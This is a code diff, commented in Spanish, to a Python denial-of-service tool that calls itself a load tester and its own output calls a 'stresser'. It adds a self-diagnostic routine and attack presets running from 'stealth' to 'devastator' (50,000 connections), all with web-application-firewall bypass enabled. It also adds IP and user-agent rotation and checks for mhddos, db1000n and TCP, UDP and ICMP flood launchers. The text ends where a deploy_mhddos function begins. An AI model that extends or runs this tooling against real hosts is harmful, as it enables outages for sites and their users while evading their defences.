@@ -25,6 +25,10 @@ from urllib.parse import urlparse
 from collections import defaultdict
 import argparse
 import csv
+import cProfile
+import pstats
+import io
+from functools import wraps
 
 # Silenciar warnings de SSL/urllib3
 try:
@@ -290,7 +294,30 @@ attack_stats = {
     "responses_received": 0,
     "http_codes": defaultdict(int),
     "latencies": [],
-    "errors": []
+    "errors": [],
+    # Sistema de deduplicación de errores
+    "error_counts": defaultdict(int),  # {error_message: count}
+    "unique_errors": [],  # Lista de errores únicos con contador
+    "last_error_log_time": {},  # {error_message: timestamp} para throttling
+    # Métricas avanzadas por herramienta
+    "tool_metrics": {},  # {tool_name: {requests, responses, errors, avg_latency, rps}}
+    # Análisis de respuesta en tiempo real
+    "response_analysis": {
+        "baseline_latency": None,
+        "current_latency": None,
+        "degradation_detected": False,
+        "error_rate_trend": [],
+        "health_status": "healthy"  # healthy, degraded, critical
+    },
+    # Health checks
+    "health_checks": {
+        "baseline": None,
+        "last_check": None,
+        "check_history": []
+    },
+    # Endpoints priorizados
+    "prioritized_endpoints": [],
+    "endpoint_metrics": {}  # {endpoint: {requests, success_rate, avg_latency}}
 }
 
 # User-Agents para rotación - Base expandida y realista
@@ -355,6 +382,74 @@ MAX_RETRIES = 0  # Número máximo de reintentos (0 = sin retries)
 RETRY_BACKOFF_FACTOR = 0.3  # Factor de backoff para retries
 RETRY_STATUS_CODES = [500, 502, 503, 504]  # Códigos HTTP para retry
 
+# Timeouts adaptativos (se ajustan dinámicamente)
+ADAPTIVE_TIMEOUTS = True  # Activar timeouts adaptativos
+MIN_CONNECT_TIMEOUT = 1.0  # Timeout mínimo de conexión
+MAX_CONNECT_TIMEOUT = 10.0  # Timeout máximo de conexión
+MIN_READ_TIMEOUT = 2.0  # Timeout mínimo de lectura
+MAX_READ_TIMEOUT = 15.0  # Timeout máximo de lectura
+
+# Health checks del target
+HEALTH_CHECK_ENABLED = True  # Activar health checks
+HEALTH_CHECK_INTERVAL = 30  # Intervalo entre health checks (segundos)
+HEALTH_CHECK_TIMEOUT = 5  # Timeout para health checks
+
+# Análisis de respuesta en tiempo real
+REALTIME_ANALYSIS_ENABLED = True  # Activar análisis en tiempo real
+ANALYSIS_INTERVAL = 10  # Intervalo de análisis (segundos)
+DEGRADATION_THRESHOLD = 2.0  # Multiplicador de latencia para detectar degradación
+ERROR_RATE_THRESHOLD = 0.5  # 50% de errores para considerar degradación crítica
+
+# Sistema de deduplicación de errores
+ERROR_DEDUPLICATION_ENABLED = True  # Activar deduplicación de errores
+ERROR_LOG_THROTTLE_SECONDS = 5  # Tiempo mínimo entre logs del mismo error (segundos)
+MAX_UNIQUE_ERRORS = 100  # Máximo número de errores únicos a mantener
+MAX_ERROR_COUNT = 1000  # Máximo número total de errores en la lista
+
+# Presets de ataque
+ATTACK_PRESETS = {
+    "stealth": {
+        "power_level": "LIGHT",
+        "connections": 1000,
+        "threads": 50,
+        "stealth": True,
+        "bypass_waf": True,
+        "rate_adaptive": True
+    },
+    "balanced": {
+        "power_level": "MODERATE",
+        "connections": 5000,
+        "threads": 200,
+        "stealth": False,
+        "bypass_waf": True,
+        "rate_adaptive": True
+    },
+    "aggressive": {
+        "power_level": "HEAVY",
+        "connections": 10000,
+        "threads": 400,
+        "stealth": False,
+        "bypass_waf": True,
+        "rate_adaptive": False
+    },
+    "extreme": {
+        "power_level": "EXTREME",
+        "connections": 20000,
+        "threads": 800,
+        "stealth": False,
+        "bypass_waf": True,
+        "rate_adaptive": False
+    },
+    "devastator": {
+        "power_level": "DEVASTATOR",
+        "connections": 50000,
+        "threads": 2000,
+        "stealth": False,
+        "bypass_waf": True,
+        "rate_adaptive": False
+    }
+}
+
 # Configuración de rotación
 USER_AGENT_ROTATION_INTERVAL = 100  # Rotar User-Agent cada N requests
 IP_ROTATION_INTERVAL = 50  # Rotar IP cada N requests
@@ -370,6 +465,28 @@ RATE_ADAPTIVE_FACTOR = 1.1  # Factor de ajuste adaptativo
 BACKOFF_STRATEGY = "exponential"  # exponential, linear, constant
 BACKOFF_MAX_DELAY = 5.0  # Delay máximo en segundos
 BACKOFF_MIN_DELAY = 0.1  # Delay mínimo en segundos
+
+# Performance profiling
+PROFILING_ENABLED = False  # Activar profiling de rendimiento
+PROFILE_OUTPUT_DIR = OUTPUT_DIR / "profiles"
+
+# Exportación de métricas
+METRICS_EXPORT_ENABLED = False  # Activar exportación de métricas
+METRICS_EXPORT_FORMAT = "prometheus"  # prometheus, influxdb, json
+METRICS_EXPORT_INTERVAL = 10  # Intervalo de exportación (segundos)
+METRICS_EXPORT_PATH = OUTPUT_DIR / "metrics"
+
+# Templates de ataque
+TEMPLATES_DIR = CONFIG_DIR / "templates"
+
+# API REST
+API_ENABLED = False  # Activar API REST
+API_PORT = 8080  # Puerto para API REST
+API_HOST = "127.0.0.1"  # Host para API REST
+
+# Scheduler
+SCHEDULER_ENABLED = False  # Activar scheduler
+SCHEDULER_JOBS_FILE = CONFIG_DIR / "scheduled_jobs.json"
 
 # ============================================================================
 # CLASES Y UTILIDADES MEJORADAS
@@ -869,12 +986,20 @@ def validate_critical_variables():
             
             TARGET_TYPE = "DOMAIN"
             DOMAIN = target_host
-            IP_ADDRESS = None
+            # Resolver IP del dominio para evitar errores DNS repetitivos
+            try:
+                import socket
+                resolved_ip = socket.gethostbyname(target_host)
+                IP_ADDRESS = resolved_ip
+                log_message("DEBUG", f"DNS resuelto: {target_host} -> {resolved_ip}", context="validate_critical_variables")
+            except (socket.gaierror, socket.herror, OSError) as e:
+                IP_ADDRESS = None
+                log_message("WARN", f"No se pudo resolver DNS para {target_host}: {e}", context="validate_critical_variables", force_console=True)
             NETWORK_TYPE = "PUBLIC"  # Los dominios generalmente apuntan a IPs públicas
             if WEB_PANEL_MODE:
-                log_message("INFO", f"🌐 [VALIDATION] Dominio detectado: {target_host}", context="validate_critical_variables", force_console=True)
+                log_message("INFO", f"🌐 [VALIDATION] Dominio detectado: {target_host}" + (f" -> {IP_ADDRESS}" if IP_ADDRESS else ""), context="validate_critical_variables", force_console=True)
             else:
-                log_message("INFO", f"Target es dominio: {target_host}", context="validate_critical_variables")
+                log_message("INFO", f"Target es dominio: {target_host}" + (f" -> {IP_ADDRESS}" if IP_ADDRESS else ""), context="validate_critical_variables")
         
         if WEB_PANEL_MODE:
             log_message("INFO", f"✅ [VALIDATION] Target validado: {TARGET} ({DOMAIN}:{PORT}) - Tipo: {TARGET_TYPE}, Red: {NETWORK_TYPE}", context="validate_critical_variables", force_console=True)
@@ -913,6 +1038,622 @@ def validate_dependencies() -> Dict[str, bool]:
             dependencies[tool] = check_command_exists(tool)
     
     return dependencies
+
+def run_autodiagnostic() -> Dict:
+    """
+    Función completa de autodiagnóstico que verifica todas las herramientas,
+    funciones, dependencias, configuración y genera un reporte detallado de errores.
+    """
+    import platform as platform_module
+    
+    print_color("\n" + "="*80, Colors.CYAN, True)
+    print_color("🔍 AUTODIAGNÓSTICO COMPLETO DEL STRESSER", Colors.BOLD, True)
+    print_color("="*80, Colors.CYAN, True)
+    
+    diagnostic_report = {
+        "timestamp": datetime.now().isoformat(),
+        "version": VERSION,
+        "system": {
+            "platform": platform_module.system(),
+            "python_version": platform_module.python_version(),
+            "architecture": platform_module.machine()
+        },
+        "checks": {
+            "tools": {},
+            "dependencies": {},
+            "permissions": {},
+            "directories": {},
+            "functions": {},
+            "configuration": {},
+            "connectivity": {},
+            "code_integrity": {}
+        },
+        "errors": [],
+        "warnings": [],
+        "suggestions": [],
+        "summary": {
+            "total_checks": 0,
+            "passed": 0,
+            "failed": 0,
+            "warnings": 0
+        }
+    }
+    
+    total_checks = 0
+    passed_checks = 0
+    failed_checks = 0
+    warning_checks = 0
+    
+    # ========================================================================
+    # 1. VERIFICACIÓN DE HERRAMIENTAS
+    # ========================================================================
+    print_color("\n📦 Verificando herramientas instaladas...", Colors.CYAN, True)
+    all_tools = set()
+    for category, tools in TOOLS.items():
+        all_tools.update(tools)
+    
+    tools_status = {}
+    for tool in sorted(all_tools):
+        total_checks += 1
+        exists = check_command_exists(tool)
+        tools_status[tool] = exists
+        diagnostic_report["checks"]["tools"][tool] = exists
+        
+        if exists:
+            passed_checks += 1
+            print_color(f"  ✅ {tool}", Colors.GREEN)
+        else:
+            failed_checks += 1
+            print_color(f"  ❌ {tool} - NO INSTALADO", Colors.RED)
+            diagnostic_report["errors"].append({
+                "category": "tools",
+                "item": tool,
+                "message": f"Herramienta '{tool}' no está instalada",
+                "severity": "high",
+                "solution": f"Ejecutar: python loadtest.py --install-tools"
+            })
+    
+    # ========================================================================
+    # 2. VERIFICACIÓN DE DEPENDENCIAS PYTHON
+    # ========================================================================
+    print_color("\n🐍 Verificando dependencias Python...", Colors.CYAN, True)
+    required_modules = [
+        "requests", "psutil", "urllib3", "socket", "ssl", "threading",
+        "subprocess", "json", "datetime", "pathlib", "argparse", "re",
+        "time", "random", "string", "collections", "hashlib", "platform"
+    ]
+    
+    optional_modules = [
+        "reportlab", "flask", "flask_cors", "dateutil"
+    ]
+    
+    dependencies_status = {}
+    for module in required_modules:
+        total_checks += 1
+        try:
+            __import__(module)
+            exists = True
+            passed_checks += 1
+            print_color(f"  ✅ {module}", Colors.GREEN)
+        except ImportError:
+            exists = False
+            failed_checks += 1
+            print_color(f"  ❌ {module} - NO INSTALADO", Colors.RED)
+            diagnostic_report["errors"].append({
+                "category": "dependencies",
+                "item": module,
+                "message": f"Módulo Python '{module}' no está instalado",
+                "severity": "critical",
+                "solution": f"Ejecutar: pip install {module}"
+            })
+        dependencies_status[module] = exists
+        diagnostic_report["checks"]["dependencies"][module] = exists
+    
+    for module in optional_modules:
+        total_checks += 1
+        try:
+            __import__(module)
+            exists = True
+            passed_checks += 1
+            print_color(f"  ✅ {module} (opcional)", Colors.GREEN)
+        except ImportError:
+            exists = False
+            warning_checks += 1
+            print_color(f"  ⚠️ {module} (opcional) - NO INSTALADO", Colors.YELLOW)
+            diagnostic_report["warnings"].append({
+                "category": "dependencies",
+                "item": module,
+                "message": f"Módulo opcional '{module}' no está instalado",
+                "severity": "low",
+                "solution": f"Ejecutar: pip install {module} (opcional pero recomendado)"
+            })
+        dependencies_status[module] = exists
+        diagnostic_report["checks"]["dependencies"][module] = exists
+    
+    # ========================================================================
+    # 3. VERIFICACIÓN DE PERMISOS
+    # ========================================================================
+    print_color("\n🔐 Verificando permisos del sistema...", Colors.CYAN, True)
+    permissions_status = {}
+    
+    # Verificar permisos de escritura en directorios
+    directories_to_check = [OUTPUT_DIR, REPORTS_DIR, LOGS_DIR, CONFIG_DIR, HISTORY_DIR]
+    for directory in directories_to_check:
+        total_checks += 1
+        try:
+            directory.mkdir(parents=True, exist_ok=True)
+            test_file = directory / ".test_write"
+            test_file.write_text("test")
+            test_file.unlink()
+            permissions_status[str(directory)] = True
+            passed_checks += 1
+            print_color(f"  ✅ {directory.name}/ - Permisos OK", Colors.GREEN)
+        except (PermissionError, OSError) as e:
+            permissions_status[str(directory)] = False
+            failed_checks += 1
+            print_color(f"  ❌ {directory.name}/ - Sin permisos de escritura", Colors.RED)
+            diagnostic_report["errors"].append({
+                "category": "permissions",
+                "item": str(directory),
+                "message": f"Sin permisos de escritura en {directory}",
+                "severity": "high",
+                "solution": f"Ejecutar: chmod 755 {directory} o ejecutar como administrador"
+            })
+        diagnostic_report["checks"]["permissions"][str(directory)] = permissions_status.get(str(directory), False)
+    
+    # Verificar permisos de root (si es necesario)
+    total_checks += 1
+    is_root = os.name != 'nt' and os.geteuid() == 0
+    if is_root:
+        passed_checks += 1
+        print_color("  ✅ Ejecutando como root", Colors.GREEN)
+    else:
+        warning_checks += 1
+        print_color("  ⚠️ No ejecutando como root (algunas funciones pueden estar limitadas)", Colors.YELLOW)
+        diagnostic_report["warnings"].append({
+            "category": "permissions",
+            "item": "root",
+            "message": "No se ejecuta como root - algunas funcionalidades pueden estar limitadas",
+            "severity": "low",
+            "solution": "Ejecutar con sudo si se requieren permisos elevados"
+        })
+    diagnostic_report["checks"]["permissions"]["root"] = is_root
+    
+    # ========================================================================
+    # 4. VERIFICACIÓN DE DIRECTORIOS Y ARCHIVOS
+    # ========================================================================
+    print_color("\n📁 Verificando directorios y archivos...", Colors.CYAN, True)
+    directories_status = {}
+    
+    critical_dirs = {
+        "OUTPUT_DIR": OUTPUT_DIR,
+        "REPORTS_DIR": REPORTS_DIR,
+        "LOGS_DIR": LOGS_DIR,
+        "CONFIG_DIR": CONFIG_DIR,
+        "HISTORY_DIR": HISTORY_DIR
+    }
+    
+    for name, directory in critical_dirs.items():
+        total_checks += 1
+        try:
+            directory.mkdir(parents=True, exist_ok=True)
+            if directory.exists() and directory.is_dir():
+                directories_status[name] = True
+                passed_checks += 1
+                print_color(f"  ✅ {name} ({directory})", Colors.GREEN)
+            else:
+                directories_status[name] = False
+                failed_checks += 1
+                print_color(f"  ❌ {name} - No existe o no es directorio", Colors.RED)
+                diagnostic_report["errors"].append({
+                    "category": "directories",
+                    "item": name,
+                    "message": f"Directorio {directory} no existe o no es válido",
+                    "severity": "high",
+                    "solution": f"Crear directorio: mkdir -p {directory}"
+                })
+        except Exception as e:
+            directories_status[name] = False
+            failed_checks += 1
+            print_color(f"  ❌ {name} - Error: {e}", Colors.RED)
+            diagnostic_report["errors"].append({
+                "category": "directories",
+                "item": name,
+                "message": f"Error verificando {directory}: {e}",
+                "severity": "high",
+                "solution": f"Verificar permisos y crear directorio: mkdir -p {directory}"
+            })
+        diagnostic_report["checks"]["directories"][name] = directories_status.get(name, False)
+    
+    # Verificar archivos críticos
+    critical_files = {
+        "loadtest.py": SCRIPT_DIR / "loadtest.py",
+        "loadtest_web.py": SCRIPT_DIR / "loadtest_web.py",
+        "requirements.txt": SCRIPT_DIR / "requirements.txt"
+    }
+    
+    for name, file_path in critical_files.items():
+        total_checks += 1
+        if file_path.exists() and file_path.is_file():
+            passed_checks += 1
+            print_color(f"  ✅ {name}", Colors.GREEN)
+            diagnostic_report["checks"]["directories"][f"file_{name}"] = True
+        else:
+            failed_checks += 1
+            print_color(f"  ❌ {name} - NO ENCONTRADO", Colors.RED)
+            diagnostic_report["errors"].append({
+                "category": "files",
+                "item": name,
+                "message": f"Archivo crítico '{name}' no encontrado",
+                "severity": "critical",
+                "solution": f"Verificar que el archivo existe en {file_path}"
+            })
+            diagnostic_report["checks"]["directories"][f"file_{name}"] = False
+    
+    # ========================================================================
+    # 5. VERIFICACIÓN DE FUNCIONES CRÍTICAS
+    # ========================================================================
+    print_color("\n⚙️ Verificando funciones críticas...", Colors.CYAN, True)
+    critical_functions = [
+        "validate_critical_variables",
+        "validate_permissions",
+        "check_command_exists",
+        "check_system_resources",
+        "fingerprint_target",
+        "deploy_custom_http_attack",
+        "monitor_attack",
+        "generate_report",
+        "log_message",
+        "recommend_tools_from_fingerprint",
+        "perform_target_health_check",
+        "analyze_realtime_response",
+        "adjust_adaptive_timeouts",
+        "prioritize_endpoints",
+        "update_tool_metrics"
+    ]
+    
+    functions_status = {}
+    for func_name in critical_functions:
+        total_checks += 1
+        try:
+            func = globals().get(func_name)
+            if func and callable(func):
+                functions_status[func_name] = True
+                passed_checks += 1
+                print_color(f"  ✅ {func_name}()", Colors.GREEN)
+            else:
+                functions_status[func_name] = False
+                failed_checks += 1
+                print_color(f"  ❌ {func_name}() - NO DEFINIDA", Colors.RED)
+                diagnostic_report["errors"].append({
+                    "category": "functions",
+                    "item": func_name,
+                    "message": f"Función crítica '{func_name}' no está definida",
+                    "severity": "critical",
+                    "solution": f"Verificar integridad del código - función faltante"
+                })
+        except Exception as e:
+            functions_status[func_name] = False
+            failed_checks += 1
+            print_color(f"  ❌ {func_name}() - Error: {e}", Colors.RED)
+            diagnostic_report["errors"].append({
+                "category": "functions",
+                "item": func_name,
+                "message": f"Error verificando función '{func_name}': {e}",
+                "severity": "critical",
+                "solution": "Verificar integridad del código"
+            })
+        diagnostic_report["checks"]["functions"][func_name] = functions_status.get(func_name, False)
+    
+    # ========================================================================
+    # 6. VERIFICACIÓN DE CONFIGURACIÓN
+    # ========================================================================
+    print_color("\n⚙️ Verificando configuración...", Colors.CYAN, True)
+    config_status = {}
+    
+    config_checks = {
+        "TARGET": TARGET,
+        "DURATION": DURATION,
+        "POWER_LEVEL": POWER_LEVEL,
+        "MAX_CONNECTIONS": MAX_CONNECTIONS,
+        "MAX_THREADS": MAX_THREADS,
+        "CONNECT_TIMEOUT": CONNECT_TIMEOUT,
+        "READ_TIMEOUT": READ_TIMEOUT
+    }
+    
+    for config_name, config_value in config_checks.items():
+        total_checks += 1
+        if config_value is not None and (not isinstance(config_value, (int, float)) or config_value > 0):
+            config_status[config_name] = True
+            passed_checks += 1
+            print_color(f"  ✅ {config_name} = {config_value}", Colors.GREEN)
+        else:
+            config_status[config_name] = False
+            warning_checks += 1
+            print_color(f"  ⚠️ {config_name} - Valor inválido: {config_value}", Colors.YELLOW)
+            diagnostic_report["warnings"].append({
+                "category": "configuration",
+                "item": config_name,
+                "message": f"Configuración '{config_name}' tiene valor inválido: {config_value}",
+                "severity": "medium",
+                "solution": f"Verificar y ajustar valor de {config_name}"
+            })
+        diagnostic_report["checks"]["configuration"][config_name] = config_status.get(config_name, False)
+    
+    # ========================================================================
+    # 7. VERIFICACIÓN DE CONECTIVIDAD
+    # ========================================================================
+    print_color("\n🌐 Verificando conectividad...", Colors.CYAN, True)
+    connectivity_status = {}
+    
+    # Verificar conectividad básica de red
+    total_checks += 1
+    try:
+        import socket
+        socket.create_connection(("8.8.8.8", 53), timeout=3)
+        connectivity_status["internet"] = True
+        passed_checks += 1
+        print_color("  ✅ Conectividad a Internet", Colors.GREEN)
+    except Exception as e:
+        connectivity_status["internet"] = False
+        failed_checks += 1
+        print_color(f"  ❌ Sin conectividad a Internet: {e}", Colors.RED)
+        diagnostic_report["errors"].append({
+            "category": "connectivity",
+            "item": "internet",
+            "message": "Sin conectividad a Internet",
+            "severity": "high",
+            "solution": "Verificar conexión de red y firewall"
+        })
+    diagnostic_report["checks"]["connectivity"]["internet"] = connectivity_status.get("internet", False)
+    
+    # Verificar DNS
+    total_checks += 1
+    try:
+        import socket
+        socket.gethostbyname("google.com")
+        connectivity_status["dns"] = True
+        passed_checks += 1
+        print_color("  ✅ Resolución DNS", Colors.GREEN)
+    except Exception as e:
+        connectivity_status["dns"] = False
+        failed_checks += 1
+        print_color(f"  ❌ Error de resolución DNS: {e}", Colors.RED)
+        diagnostic_report["errors"].append({
+            "category": "connectivity",
+            "item": "dns",
+            "message": "Error de resolución DNS",
+            "severity": "high",
+            "solution": "Verificar configuración DNS del sistema"
+        })
+    diagnostic_report["checks"]["connectivity"]["dns"] = connectivity_status.get("dns", False)
+    
+    # ========================================================================
+    # 8. VERIFICACIÓN DE INTEGRIDAD DEL CÓDIGO
+    # ========================================================================
+    print_color("\n🔒 Verificando integridad del código...", Colors.CYAN, True)
+    code_integrity_status = {}
+    
+    # Verificar que las funciones principales existen y son callables
+    main_functions = ["main", "monitor_attack", "deploy_custom_http_attack"]
+    for func_name in main_functions:
+        total_checks += 1
+        try:
+            func = globals().get(func_name)
+            if func and callable(func):
+                code_integrity_status[func_name] = True
+                passed_checks += 1
+                print_color(f"  ✅ Función principal '{func_name}' OK", Colors.GREEN)
+            else:
+                code_integrity_status[func_name] = False
+                failed_checks += 1
+                print_color(f"  ❌ Función principal '{func_name}' NO ENCONTRADA", Colors.RED)
+                diagnostic_report["errors"].append({
+                    "category": "code_integrity",
+                    "item": func_name,
+                    "message": f"Función principal '{func_name}' no encontrada o no es callable",
+                    "severity": "critical",
+                    "solution": "Verificar integridad del archivo loadtest.py"
+                })
+        except Exception as e:
+            code_integrity_status[func_name] = False
+            failed_checks += 1
+            print_color(f"  ❌ Error verificando '{func_name}': {e}", Colors.RED)
+            diagnostic_report["errors"].append({
+                "category": "code_integrity",
+                "item": func_name,
+                "message": f"Error verificando función '{func_name}': {e}",
+                "severity": "critical",
+                "solution": "Verificar integridad del código"
+            })
+        diagnostic_report["checks"]["code_integrity"][func_name] = code_integrity_status.get(func_name, False)
+    
+    # Verificar que las clases principales existen
+    main_classes = ["ConnectionManager", "PerformanceMonitor"]
+    for class_name in main_classes:
+        total_checks += 1
+        try:
+            cls = globals().get(class_name)
+            if cls and isinstance(cls, type):
+                code_integrity_status[class_name] = True
+                passed_checks += 1
+                print_color(f"  ✅ Clase '{class_name}' OK", Colors.GREEN)
+            else:
+                code_integrity_status[class_name] = False
+                warning_checks += 1
+                print_color(f"  ⚠️ Clase '{class_name}' NO ENCONTRADA", Colors.YELLOW)
+                diagnostic_report["warnings"].append({
+                    "category": "code_integrity",
+                    "item": class_name,
+                    "message": f"Clase '{class_name}' no encontrada",
+                    "severity": "medium",
+                    "solution": "Verificar que la clase esté definida en el código"
+                })
+        except Exception as e:
+            code_integrity_status[class_name] = False
+            warning_checks += 1
+            print_color(f"  ⚠️ Error verificando clase '{class_name}': {e}", Colors.YELLOW)
+        diagnostic_report["checks"]["code_integrity"][class_name] = code_integrity_status.get(class_name, False)
+    
+    # ========================================================================
+    # 9. VERIFICACIÓN DE FUNCIONES DE DESPLIEGUE
+    # ========================================================================
+    print_color("\n🚀 Verificando funciones de despliegue...", Colors.CYAN, True)
+    deploy_functions = [
+        "deploy_wrk_attack", "deploy_vegeta_attack", "deploy_bombardier_attack",
+        "deploy_hey_attack", "deploy_ab_attack", "deploy_siege_attack",
+        "deploy_mhddos", "deploy_db1000n", "deploy_qrator", "deploy_ddosify",
+        "deploy_tcp_flood_advanced", "deploy_udp_flood", "deploy_icmp_flood"
+    ]
+    
+    deploy_status = {}
+    for func_name in deploy_functions:
+        total_checks += 1
+        try:
+            func = globals().get(func_name)
+            if func and callable(func):
+                deploy_status[func_name] = True
+                passed_checks += 1
+                print_color(f"  ✅ {func_name}()", Colors.GREEN)
+            else:
+                deploy_status[func_name] = False
+                warning_checks += 1
+                print_color(f"  ⚠️ {func_name}() - NO DEFINIDA", Colors.YELLOW)
+                diagnostic_report["warnings"].append({
+                    "category": "deploy_functions",
+                    "item": func_name,
+                    "message": f"Función de despliegue '{func_name}' no está definida",
+                    "severity": "medium",
+                    "solution": f"Verificar que la función esté implementada"
+                })
+        except Exception as e:
+            deploy_status[func_name] = False
+            warning_checks += 1
+            print_color(f"  ⚠️ Error verificando '{func_name}': {e}", Colors.YELLOW)
+        diagnostic_report["checks"]["functions"][func_name] = deploy_status.get(func_name, False)
+    
+    # ========================================================================
+    # 10. GENERAR SUGERENCIAS AUTOMÁTICAS
+    # ========================================================================
+    print_color("\n💡 Generando sugerencias automáticas...", Colors.CYAN, True)
+    
+    # Sugerencias basadas en errores encontrados
+    if failed_checks > 0:
+        diagnostic_report["suggestions"].append({
+            "priority": "high",
+            "message": f"Se encontraron {failed_checks} error(es) crítico(s). Revisar y corregir antes de usar la herramienta.",
+            "action": "Revisar la sección de errores arriba"
+        })
+    
+    if len([e for e in diagnostic_report["errors"] if e.get("category") == "tools"]) > 5:
+        diagnostic_report["suggestions"].append({
+            "priority": "high",
+            "message": "Muchas herramientas faltantes. Instalar herramientas recomendadas.",
+            "action": "Ejecutar: python loadtest.py --install-tools"
+        })
+    
+    if len([e for e in diagnostic_report["errors"] if e.get("category") == "dependencies"]) > 0:
+        diagnostic_report["suggestions"].append({
+            "priority": "critical",
+            "message": "Dependencias Python faltantes. Instalar dependencias requeridas.",
+            "action": "Ejecutar: pip install -r requirements.txt"
+        })
+    
+    if len([e for e in diagnostic_report["errors"] if e.get("category") == "permissions"]) > 0:
+        diagnostic_report["suggestions"].append({
+            "priority": "high",
+            "message": "Problemas de permisos detectados. Verificar permisos de directorios.",
+            "action": "Ejecutar con permisos adecuados o ajustar permisos de directorios"
+        })
+    
+    # ========================================================================
+    # RESUMEN FINAL
+    # ========================================================================
+    diagnostic_report["summary"] = {
+        "total_checks": total_checks,
+        "passed": passed_checks,
+        "failed": failed_checks,
+        "warnings": warning_checks,
+        "success_rate": (passed_checks / total_checks * 100) if total_checks > 0 else 0
+    }
+    
+    print_color("\n" + "="*80, Colors.CYAN, True)
+    print_color("📊 RESUMEN DEL AUTODIAGNÓSTICO", Colors.BOLD, True)
+    print_color("="*80, Colors.CYAN)
+    print_color(f"Total de verificaciones: {total_checks}", Colors.WHITE)
+    print_color(f"✅ Exitosas: {passed_checks}", Colors.GREEN)
+    print_color(f"❌ Fallidas: {failed_checks}", Colors.RED if failed_checks > 0 else Colors.WHITE)
+    print_color(f"⚠️ Advertencias: {warning_checks}", Colors.YELLOW if warning_checks > 0 else Colors.WHITE)
+    print_color(f"📈 Tasa de éxito: {diagnostic_report['summary']['success_rate']:.1f}%", Colors.CYAN)
+    
+    if failed_checks > 0:
+        print_color(f"\n❌ ERRORES CRÍTICOS ENCONTRADOS: {failed_checks}", Colors.RED, True)
+        print_color("Revisa la sección de errores arriba para soluciones.", Colors.YELLOW)
+        
+        # Mostrar resumen de errores por categoría
+        error_categories = {}
+        for error in diagnostic_report["errors"]:
+            category = error.get("category", "unknown")
+            if category not in error_categories:
+                error_categories[category] = []
+            error_categories[category].append(error)
+        
+        print_color("\n📋 Resumen de errores por categoría:", Colors.YELLOW)
+        for category, errors in error_categories.items():
+            print_color(f"  • {category}: {len(errors)} error(es)", Colors.RED)
+            # Mostrar primeros 3 errores de cada categoría
+            for error in errors[:3]:
+                print_color(f"    - {error.get('item', 'unknown')}: {error.get('message', '')[:60]}", Colors.WHITE)
+            if len(errors) > 3:
+                print_color(f"    ... y {len(errors) - 3} más", Colors.WHITE)
+    else:
+        print_color("\n✅ No se encontraron errores críticos", Colors.GREEN, True)
+    
+    if warning_checks > 0:
+        print_color(f"\n⚠️ ADVERTENCIAS: {warning_checks}", Colors.YELLOW, True)
+        print_color("Revisa las advertencias para optimizaciones.", Colors.YELLOW)
+    
+    # Mostrar sugerencias principales
+    if diagnostic_report["suggestions"]:
+        print_color("\n💡 SUGERENCIAS PRINCIPALES:", Colors.CYAN, True)
+        high_priority = [s for s in diagnostic_report["suggestions"] if s.get("priority") in ["critical", "high"]]
+        for suggestion in high_priority[:5]:  # Mostrar solo las 5 más importantes
+            priority_color = Colors.RED if suggestion.get("priority") == "critical" else Colors.YELLOW
+            print_color(f"  [{suggestion.get('priority', 'info').upper()}] {suggestion.get('message', '')}", priority_color)
+            print_color(f"    → {suggestion.get('action', '')}", Colors.CYAN)
+    
+    # Guardar reporte
+    try:
+        report_file = REPORTS_DIR / f"autodiagnostic_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+        with open(report_file, 'w', encoding='utf-8') as f:
+            json.dump(diagnostic_report, f, indent=2, default=str)
+        print_color(f"\n📄 Reporte completo guardado en: {report_file}", Colors.CYAN)
+        print_color(f"   Puedes revisar el reporte JSON para detalles completos.", Colors.WHITE)
+    except Exception as e:
+        log_message("ERROR", f"Error guardando reporte de autodiagnóstico: {e}")
+    
+    # Mostrar comandos rápidos para solucionar problemas
+    if failed_checks > 0 or warning_checks > 0:
+        tools_errors = [e for e in diagnostic_report["errors"] if e.get("category") == "tools"]
+        deps_errors = [e for e in diagnostic_report["errors"] if e.get("category") == "dependencies"]
+        perm_errors = [e for e in diagnostic_report["errors"] if e.get("category") == "permissions"]
+        
+        print_color("\n🔧 COMANDOS RÁPIDOS PARA SOLUCIONAR PROBLEMAS:", Colors.CYAN, True)
+        if len(tools_errors) > 0:
+            print_color("  • Instalar herramientas faltantes:", Colors.WHITE)
+            print_color("    python loadtest.py --install-tools", Colors.GREEN)
+        if len(deps_errors) > 0:
+            print_color("  • Instalar dependencias Python:", Colors.WHITE)
+            missing_deps = [e.get("item") for e in deps_errors if e.get("item") not in ["socket", "ssl", "threading", "subprocess", "json", "datetime", "pathlib", "argparse", "re", "time", "random", "string", "collections", "hashlib", "platform"]]
+            if missing_deps:
+                print_color(f"    pip install {' '.join(missing_deps[:5])}", Colors.GREEN)
+        if len(perm_errors) > 0:
+            print_color("  • Verificar permisos:", Colors.WHITE)
+            print_color("    chmod 755 output/ reports/ logs/ config/ history/", Colors.GREEN)
+    
+    print_color("="*80 + "\n", Colors.CYAN)
+    
+    return diagnostic_report
 
 def check_python_module(module: str) -> bool:
     """Verifica si un módulo de Python está instalado"""
@@ -4520,7 +5261,7 @@ def deploy_custom_http_attack():
                 except Exception as e:
                     # Limitar tamaño de lista de errores para evitar consumo excesivo de memoria
                     if len(attack_stats.get("errors", [])) < 1000:
-                        attack_stats["errors"].append(str(e)[:100])  # Limitar longitud del error
+                        add_error_deduplicated(str(e), max_length=100)
                     
                     attack_stats["requests_sent"] += 1  # Contar intento aunque falle
                     error_msg = str(e)
@@ -4530,8 +5271,15 @@ def deploy_custom_http_attack():
                     consecutive_errors += 1
                     
                     # Loggear errores directamente en consola para diagnóstico inmediato
-                    # Mostrar siempre los primeros errores y errores de conexión importantes
-                    if request_count < 5 or (consecutive_errors < 5 and ("Connection" in error_msg or "timeout" in error_msg.lower() or "NameResolution" in error_msg)):
+                    # Reducir saturación: solo mostrar primeros errores y errores críticos no-DNS
+                    # Los errores DNS repetitivos se loggean menos frecuentemente
+                    is_dns_error = "NameResolution" in error_msg or "gaierror" in error_msg.lower()
+                    should_log = (
+                        request_count < 5 or  # Primeros errores siempre
+                        (consecutive_errors < 5 and not is_dns_error) or  # Errores no-DNS importantes
+                        (consecutive_errors == 1 and is_dns_error)  # Solo el primer error DNS por worker
+                    )
+                    if should_log:
                         # Forzar salida a consola para errores críticos
                         error_summary = f"❌ [WORKER {worker_id}] Error #{request_count}: {error_type}"
                         if "Connection" in error_msg or "timeout" in error_msg.lower():
@@ -5126,6 +5874,147 @@ def deploy_ddos_ripper():
         log_message("ERROR", f"Error desplegando ddos-ripper: {e}")
         return None
 
+def deploy_mhddos():
